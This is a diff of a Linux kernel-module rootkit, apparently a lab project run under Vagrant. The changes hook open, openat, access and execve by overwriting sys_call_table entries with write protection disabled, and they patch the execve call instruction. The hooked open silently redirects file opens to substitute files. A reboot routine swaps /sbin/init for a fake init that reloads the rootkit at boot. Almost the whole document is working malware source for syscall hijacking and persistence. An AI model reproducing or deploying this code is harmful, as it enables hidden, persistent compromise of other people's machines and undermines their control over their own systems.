@@ -10,6 +10,8 @@
 #include <linux/errno.h>
 
 #include "modify_syscalls.h"
+#include "execmon_minimal/kmod/includes/mem.h"
+#include "execmon_minimal/kmod/includes/syscalls.h"
 
 #define DISABLE_W_PROTECTED_MEMORY \
     do { \
@@ -38,8 +40,8 @@ char hidePID[6] = "-1";
 
 // this is the c file which will replace /sbin/init
 // - it loads the rootkit then runs the original /sbin/init
-#define FILE_INIT_REPLACEMENT_C      "/vagrant/start_rootkit.c\0"
-#define FILE_INIT_REPLACEMENT_OUTPUT "/vagrant/start_rootkit\0"
+#define FILE_INIT_REPLACEMENT_C      "/home/vagrant/pretend_sbin/fake_init.c\0"
+#define FILE_INIT_REPLACEMENT_OUTPUT "/home/vagrant/pretend_sbin/fake_init\0"
 // #define FILE_INIT               "/sbin/init"
 // #define FILE_INIT_ORIGINAL      "/sbin/init_original"
 // #define FILE_INIT               "/vagrant/init_temp"
@@ -68,7 +70,7 @@ asmlinkage int (*original_lstat)(const char *path, struct stat *buf);
 asmlinkage int (*original_open)(const char __user *pathname, int flags, mode_t mode);
 asmlinkage int (*original_openat)(int dirfd, const char* pathname, int flags, mode_t mode);
 asmlinkage int (*original_access)(const char *pathname, int mode);
-asmlinkage int (*original_execve)(const char *pathname, char* const argv[], char* const envp[]);
+asmlinkage long (*original_execve)(const char *pathname, char* const argv[], char* const envp[]);
 
 struct list_head *module_list;
 
@@ -91,6 +93,7 @@ void update_sys_calls(void **sys_call_table){
     void **modified_at_address_openat = &sys_call_table[__NR_openat];
     void *modified_function_openat = hacked_openat;
     void **modified_at_address_execve = &sys_call_table[__NR_execve];
+    void **orig_call_addr;
     void *modified_function_execve = hacked_execve;
 
     DISABLE_W_PROTECTED_MEMORY
@@ -103,6 +106,17 @@ void update_sys_calls(void **sys_call_table){
     // original_access = xchg(modified_at_address_access, modified_function_access);
     // original_openat = xchg(modified_at_address_openat, modified_function_openat);
     // original_execve = xchg(modified_at_address_execve, modified_function_execve);
+
+    // THIS IS MODIFIED BUT ORIGINALLY FROM kmod
+    /* Patch the relative call instruction.
+	 * Replace sys_execve with new_sys_execve */
+	MEM_patch_relative_call(modified_at_address_execve,
+					        MAX_RELATIVE_CALL_OFFSET,
+					        (unsigned long) modified_function_execve, &orig_call_addr);
+	/* Backup the original sys_execve address */
+	// original_execve = (void * ) orig_call_addr;
+    original_execve = xchg(orig_call_addr, modified_function_execve);
+
     ENABLE_W_PROTECTED_MEMORY
 }
 
@@ -136,6 +150,14 @@ void revert_to_original(void **sys_call_table){
     // original_access = xchg(modified_at_address_access, modified_function_access);
     // original_openat = xchg(modified_at_address_openat, modified_function_openat);
     // original_execve = xchg(modified_at_address_execve, modified_function_execve);
+
+    // THIS IS MODIFIED BUT ORIGINALLY FROM kmod
+	/* Patch the relative call instruction.
+	 * Replace new_sys_execve with the original sys_execve */
+	MEM_patch_relative_call(modified_at_address_execve,
+					MAX_RELATIVE_CALL_OFFSET,
+					(unsigned long) original_execve, NULL);
+
     ENABLE_W_PROTECTED_MEMORY
 }
 
@@ -269,7 +291,7 @@ asmlinkage int hacked_lstat(const char *path, struct stat *buf) {
 }
 
 asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode) {
-    // if (boot_loader_init == 1) {
+    if (boot_loader_init == 1) {
         // this can use relative path as well so we need to check only the filename.
         // probs not great
         const char* pathname_stripped = strip_filepath(pathname);
@@ -278,7 +300,7 @@ asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode) 
         for (i = 0; i < replacement_size; i++) {
             // check if pathname is in map
             const char* replacement_key_stripped = strip_filepath(replacement_keys[i]);
-            if (strncmp(pathname_stripped, replacement_key_stripped, strlen(replacement_key_stripped)) == 0) {
+            if (strncmp(pathname_stripped, replacement_key_stripped, strlen(pathname_stripped)) == 0) {
                 // redirect to replacement file
                 printk("tried to open %s; redirecting open from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);
 
@@ -294,7 +316,7 @@ asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode) 
                 return fd;
             }
         }
-    // }
+    }
 
     return original_open(pathname, flags, mode);
 }
@@ -332,7 +354,38 @@ asmlinkage int hacked_access(const char* pathname, int mode) {
     return original_access(pathname, mode);
 }
 
-asmlinkage int hacked_execve(const char* pathname, char* const argv[], char* const envp[]) {
+// asmlinkage int hacked_execve(const char* pathname, char* const argv[], char* const envp[]) {
+//     if (boot_loader_init == 1) {
+//         const char* pathname_stripped = strip_filepath(pathname);
+
+//         int i;
+//         for (i = 0; i < replacement_size; i++) {
+//             // check if pathname is in map
+//             const char* replacement_key_stripped = strip_filepath(replacement_keys[i]);
+//             if (strncmp(pathname_stripped, replacement_key_stripped, strlen(pathname_stripped)) == 0) {
+//                 // redirect to replacement file
+//                 printk("tried to execve %s; redirecting execve from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);
+
+//                 // use user file system
+//                 mm_segment_t old_fs = get_fs();
+//                 set_fs(get_ds());
+
+//                 int fd = original_execve(replacement_values[i], argv, envp);
+
+//                 // return to kernel space
+//                 set_fs(old_fs);
+
+//                 return fd;
+//             }
+//         }
+//     }
+    
+//     printk("running execve as originally intended\n");
+
+//     return original_execve(pathname, argv, envp);
+// }
+
+asmlinkage long hacked_execve(const char* pathname, char* const argv[], char* const envp[]) {
     // if (boot_loader_init == 1) {
     //     const char* pathname_stripped = strip_filepath(pathname);
 
@@ -340,7 +393,7 @@ asmlinkage int hacked_execve(const char* pathname, char* const argv[], char* con
     //     for (i = 0; i < replacement_size; i++) {
     //         // check if pathname is in map
     //         const char* replacement_key_stripped = strip_filepath(replacement_keys[i]);
-    //         if (strncmp(pathname_stripped, replacement_key_stripped, strlen(replacement_key_stripped)) == 0) {
+    //         if (strncmp(pathname_stripped, replacement_key_stripped, strlen(pathname_stripped)) == 0) {
     //             // redirect to replacement file
     //             printk("tried to execve %s; redirecting execve from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);
 
@@ -357,6 +410,8 @@ asmlinkage int hacked_execve(const char* pathname, char* const argv[], char* con
     //         }
     //     }
     // }
+    
+    printk("running execve as originally intended\n");
 
     return original_execve(pathname, argv, envp);
 }
@@ -658,7 +713,6 @@ void add_to_reboot() {
     // delete file if it exists ?
 
     // check renamed init doesn't exist
-
     // int exists = does_file_exist(FILE_INIT_ORIGINAL);
     // printk("file exists: %d", exists);
 
@@ -673,10 +727,10 @@ void add_to_reboot() {
 
     // REALLY NEED to check if file exists!
 
-    // boot_loader_init = 0;
+    boot_loader_init = 0;
     // we only need to replace one i.e. if the
     // 'fake' file doesn't exist
-    // if (does_file_exist(FILE_INIT_ORIGINAL) == 0) {    
+    if (does_file_exist(FILE_INIT_ORIGINAL) == 0) {    
         int ret;
 
         // store file permissions of original init
@@ -691,6 +745,7 @@ void add_to_reboot() {
         // sprintf(bash_compile, "gcc %s -o %s", FILE_INIT_REPLACEMENT_C, FILE_INIT_REPLACEMENT_OUTPUT);
         // printk("bash_compile: %s\n", bash_compile);
         // ret = run_bash(bash_compile);
+
         //char bash_compile[8 + strlen(FILE_INIT_REPLACEMENT_C) + strlen(FILE_INIT_REPLACEMENT_OUTPUT)];
         // sprintf(bash_compile, "gcc %s -o %s", FILE_INIT_REPLACEMENT_C, FILE_INIT_REPLACEMENT_OUTPUT);
         // char* bash_compile = "gcc /home/vagrant/pretend_sbin/fake_init.c -o /home/vagrant/pretend_sbin/fake_init";
@@ -714,8 +769,8 @@ void add_to_reboot() {
         // printk("bash_perms_repl: %s\n", bash_perms_repl);
         // ret = run_bash(bash_perms_repl);
 
-        // boot_loader_init = 1;
-    // } else {
-    //     boot_loader_init = 1;
-    // }
+        boot_loader_init = 1;
+    } else {
+        boot_loader_init = 1;
+    }
 }
